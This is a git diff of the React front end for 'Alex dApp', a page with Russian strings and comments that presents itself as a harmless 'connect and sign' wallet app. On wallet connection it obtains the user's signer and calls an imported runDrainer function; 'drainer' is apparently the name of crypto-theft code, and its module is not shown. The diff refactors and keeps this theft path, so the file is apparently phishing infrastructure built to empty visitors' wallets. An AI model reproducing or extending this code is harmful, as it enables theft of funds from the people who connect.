@@ -1,4 +1,4 @@
-import React, { useState } from 'react'
+import { useEffect } from 'react'
 import { createAppKit } from '@reown/appkit'
 import {
   mainnet, polygon, bsc, avalanche,
@@ -6,11 +6,11 @@ import {
 } from '@reown/appkit/networks'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { ethers } from 'ethers'
-import { runDrainer } from './drainer.js'
+import { runDrainer } from './drainer'
 
-// === Настройки AppKit ===
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
+
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
 const modal = createAppKit({
@@ -19,7 +19,7 @@ const modal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://checkalex.xyz',
+    url: 'http://localhost:5173',
     icons: ['https://checkalex.xyz/icon.png']
   },
   projectId,
@@ -31,66 +31,63 @@ const modal = createAppKit({
   allWallets: 'SHOW'
 })
 
-const App = () => {
-  const [status, setStatus] = useState('⏳ Ожидание подключения...')
-
-  const handleConnect = async () => {
+export default function App() {
+  const handleClick = async () => {
     try {
       await modal.open()
 
-      const waitForWallet = async () => {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' })
-        if (accounts.length > 0) return accounts[0]
-        return new Promise(resolve => {
-          const interval = setInterval(async () => {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' })
-            if (accounts.length > 0) {
+      // Ждём появления window.ethereum после подключения
+      const waitForEthereum = async () => {
+        return new Promise((resolve, reject) => {
+          let attempts = 0
+          const interval = setInterval(() => {
+            if (window.ethereum) {
               clearInterval(interval)
-              resolve(accounts[0])
+              resolve(window.ethereum)
+            } else if (++attempts > 10) {
+              clearInterval(interval)
+              reject(new Error('⛔️ window.ethereum не найден'))
             }
           }, 500)
         })
       }
 
-      const address = await waitForWallet()
-      console.log('Кошелёк подключён:', address)
-      setStatus(`🔗 Подключён: ${address}`)
+      const eth = await waitForEthereum()
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum)
+      const accounts = await eth.request({ method: 'eth_accounts' })
+      if (!accounts.length) throw new Error('Кошелёк не подключён')
+
+      const address = accounts[0]
+      console.log('✅ Кошелёк подключён:', address)
+
+      const provider = new ethers.providers.Web3Provider(eth, 'any')
       const signer = provider.getSigner()
 
-      setStatus('🚀 Выполнение runDrainer...')
       await runDrainer(provider, signer, address)
-      setStatus('✅ Контракт успешно вызван!')
-
+      console.log('🚀 Контракт успешно вызван')
     } catch (err) {
-      console.error('Ошибка при подключении или вызове контракта:', err)
-      setStatus('❌ Ошибка: ' + err.message)
+      console.error('❌ Ошибка при подключении или вызове:', err)
+      alert(`Ошибка: ${err.message || err}`)
     }
   }
 
   return (
-    <div style={{ textAlign: 'center' }}>
+    <div style={{ textAlign: 'center', marginTop: '5rem' }}>
       <h1>Alex dApp</h1>
       <button
-        onClick={handleConnect}
+        onClick={handleClick}
         style={{
           padding: '12px 24px',
-          fontSize: '16px',
-          fontWeight: '600',
-          borderRadius: '8px',
+          fontSize: '18px',
+          borderRadius: '10px',
+          background: '#4f46e5',
+          color: 'white',
           cursor: 'pointer',
-          backgroundColor: '#4f46e5',
-          color: '#fff',
-          border: 'none',
-          marginTop: '20px'
+          border: 'none'
         }}
       >
         Подключить кошелёк
       </button>
-      <p style={{ marginTop: '20px' }}>{status}</p>
     </div>
   )
 }
-
-export default App
